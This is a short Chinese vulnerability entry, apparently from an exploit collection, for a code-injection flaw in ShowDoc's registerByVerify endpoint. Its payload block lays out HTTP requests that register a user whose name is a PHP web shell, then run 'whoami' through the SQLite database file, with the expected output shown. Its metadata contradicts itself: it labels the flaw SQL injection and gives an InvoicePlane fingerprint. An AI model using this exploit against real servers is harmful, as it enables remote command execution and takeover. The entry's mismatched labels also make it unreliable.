# ShowDocregisterByVerify存在代码注入漏洞

- **系统**：ShowDocregisterByVerify　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="InvoicePlane"`
- **请求**：`POST /server/index.php?s=/Api/Common/createCaptcha HTTP/1.1`

**请求体 / payload**
```
GET /server/index.php?s=/Api/Common/showCaptcha\&captcha\_id=301 HTTP/1.1
Host:
注册恶意用户名
POST /server/index.php?s=/Api/User/registerByVerify HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
username=%3C%3Fphp+echo%22%7CBGN1%7C%22%3Bsystem%28%24\_GET%5B%27cmd%27%5D%29%3Becho%22%7CEND%7C%22%3B%3F%3E
\&password=Showdoc%402026\&confirm\_password=Showdoc%402026\&captcha\_id=301\&captcha=43u2
触发
GET /Sqlite/showdoc.db.php?cmd=whoami HTTP/1.1
Host:
响应为 SQLite 二进制垃圾数据，中间夹带：.
SHOWDOC\_RCE\_BGNwww-dataSHOWDOC\_RCE\_END
PS:使用官方默认 Sqlite/showdoc.db.php 的实例）在执行到触发步骤时会返回 HTTP 500 Internal Serve…（脚本共 816 字，完整版见原文）
```
- **预期**：200　|　—